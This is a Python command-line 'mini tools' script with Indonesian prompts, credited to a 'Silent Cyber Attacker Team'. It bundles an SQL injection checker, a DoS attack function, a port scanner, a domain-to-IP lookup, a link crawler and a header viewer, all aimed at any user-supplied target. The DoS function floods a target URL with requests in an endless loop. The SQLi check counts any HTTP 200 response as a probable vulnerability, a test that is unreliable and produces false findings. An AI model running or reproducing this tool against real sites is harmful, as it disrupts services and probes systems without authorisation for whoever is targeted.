import os
import requests
import socket
from bs4 import BeautifulSoup

def SQLi_Checker():
    while True:
        print("\n[ SQL INJECTION CHECKER ] ") 
        print("KETIK EXIT UNTUK KELUAR") 
        url = input("URL Target: ") 
        if url.lower() == "exit":
            print("\033[H\033[J", end="")
            break
        try:
            r = requests.get(url + "'")
                
            status = print(f"Status: {r.status_code}") 
        
            if r.status_code == 200:
                print(" [!] Kemungkinan Vulnerabiltiy SQLi") 
            else:
                print("[?] Tidak Ada Vulnerability SQLi") 
        except:
            print("Terjadi Kesalahan") 
            continue
def DoS():
    while True:
        try:
            print("\n[ MINI DoS ATTACK ]") 
            print("KETIK EXIT UNTUK KELUAR") 
            target = input("URL Target: ")
            if target.lower() == "exit":
                print("\033[H\033[J", end="")
                break
            print("\n[~] Melakukan Serangan")
            print("Tekan CTRL+C Untuk Stop") 
    
            while True:
                r = requests.get(target)
        except: 
            print("Domain Error")  

def Port_Scanner():
    while True:
        print("\n[ PORT SCANNER ]") 
        print("KETIK EXIT UNTUK KELUAR") 
        target = input("Domain: ") 
        if target.lower() == "exit":
            print("\033[H\033[J", end="")
            break 
        try:
            port = int(input("PORT: ")) 
        except ValueError:
            print("Wajib Angka!") 
            continue  
        try: 
            sock = socket.socket() 
            hasil = sock.connect_ex((target, port))
            
        except socket.gaierror:
            print("Domain Tidak Di Temukan!") 
            continue
        if hasil == 0:
            print(f"Port {port} Terbuka")
            input("ENTER TO EXIT...") 
            print("\033[H\033[J", end="")
            break 
        else:
            print(f"Port {port} Tertutup") 
            input("ENTER TO EXIT...") 
            print("\033[H\033[J", end="")
            break  

def Cek_IP():
    while True:
        print("\n[ IP DOMAIN CHECKER ]") 
        print("KETIK EXIT UNTUK KELUAR") 
        url = input("Domain: ")
        if url.lower() == "exit":
            print("\033[H\033[J", end="")
            break
        try:
            ip = socket.gethostbyname(url)
            print(f"IP ADDRESS DOMAIN: {ip}") 
            input("ENTER TO EXIT..") 
            break
        except socket.gaierror:
            print("Domain Tidak Di Temukan") 
            continue
  
def Crawler_Website():
    while True:
        print("\n[ CRAWLER WEBSITE ]") 
        print("KETIK EXIT UNTUK KELUAR") 
        url = input("URL: ") 
        if url.lower() == "exit":
            os.system("clear") 
            break
            
        try:    
            r = requests.get(url) 
            soup = BeautifulSoup(r.text, "html.parser")
        
            print("=== LINK DI TEMUKAN ===")
            for link in soup.find_all("a"):
                print(link.get("href")) 
            input("ENTER UNTUK EXIT... ") 
            os.system("clear") 
            break
        except requests.exceptions.RequestException:
            print("[?] URL Tidak Di Temukan") 
            continue
        except:
            print("[?] Terjadi Kesalahan")
            continue    

def Header_Checker():
    while True:
        print("\n[ HEADER CHECKER ]")
        print("KETIK EXIT UNTUK KELUAR") 
        url = input("URL: ")
        if url.lower() == "exit":
            os.system("clear") 
            break
        
        try:
            r = requests.get(url) 
        except requests.exceptions.RequestException:
            print("[?] URL Tidak Di Temukan") 
            continue
        except:
            print("[?] Terjadi Kesalahan")
            continue 
            
        print("=== HEADER INFORMATION ===")
        for key, value in r.headers.items():
            print(f"{key}: {value}") 
            
        input("ENTER TO EXIT... ")
        os.system("clear") 
        break
           
print("\033[H\033[J", end="")
os.system('clear') 
banner = """
███╗   ███╗██╗███╗   ██╗██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
████╗ ████║██║████╗  ██║██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██╔████╔██║██║██╔██╗ ██║██║       ██║   ██║   ██║██║   ██║██║     ███████╗
██║╚██╔╝██║██║██║╚██╗██║██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
██║ ╚═╝ ██║██║██║ ╚████║██║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
               [ BY MAHES | SILENT CYBER ATTACKER TEAM ]
"""
while True:
    print(banner)
    print("[1]. SQLi CHECKER") 
    print("[2]. DoS")
    print("[3]. Port Scanner") 
    print("[4]. Cek IP Domain") 
    print("[5]. Crawler Website") 
    print("[6]. Header Checker") 
    print("[7]. Exit") 
    
    try:
        pilih = int(input("Pilih Menu: ")) 
    except ValueError:
        print("Hanya Angka!") 
        continue 
        
    if pilih == 1:
        SQLi_Checker() 
           
    elif pilih == 2:
        DoS() 
            
    elif pilih == 3:
        Port_Scanner() 
                   
    elif pilih == 4:
        Cek_IP() 
    
    elif pilih == 5:
        Crawler_Website()
    
    elif pilih == 6:
        Header_Checker() 
    
    elif pilih == 7:
        print("Goodbye 👋") 
        break
            
